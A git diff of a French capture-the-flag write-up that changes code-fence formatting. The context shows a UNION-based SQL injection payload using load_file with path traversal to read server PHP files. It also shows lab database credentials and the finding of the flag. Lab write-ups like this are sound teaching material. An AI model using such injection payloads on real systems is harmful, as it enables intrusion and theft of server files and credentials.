@@ -33,14 +33,14 @@ portfolio.php?id=3 union select 1,load_file("../../../../../../var/www/html/port
 La page s'affiche correctement, suffit de CTRL+U ! <br />
 <img src="https://i.imgur.com/h56LXRG.png"/><br />
 Voici la partie intéressante
-```diff
+```php
 <?php
 // Include config file
 require_once "administrat/include/config.php";
 ?>
 ```
 Au final, rien d'intéressant, juste les informations de la BDD
-```diff
+```php
 <?php
 $link = new mysqli("localhost", "db_user", "Str0ngP4ss", "freelancer");
 ```
@@ -49,7 +49,7 @@ Evidement, j'ai donc été plus bas
 load_file("../../../../../../var/www/html/administrat/index.php")
 ```
 Voici la partie intéressante de la page : 
-```diff
+```php
 <?php
 // Initialize the session
 session_start();
@@ -60,8 +60,8 @@ if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
   exit;
 }
 
-(pour faire simple, c'est une condition qui vérifie que $_SESSION["loggedin"] soit bien active et qu'elle soit true)
-Nous avons donc ici un systeme de connexion basique, si tu es déjà connecté, ($_SESSION["loggein"] active et true) tu es redirigé sur panel.php
+/* (pour faire simple, c'est une condition qui vérifie que $_SESSION["loggedin"] soit bien active et qu'elle soit true)
+Nous avons donc ici un systeme de connexion basique, si tu es déjà connecté, ($_SESSION["loggein"] active et true) tu es redirigé sur panel.php */
 ```
 J'ai donc fouillé la page et surprise, Le FLAG ! <br />
 <img src="https://i.imgur.com/oarpGmr.png"/><br />
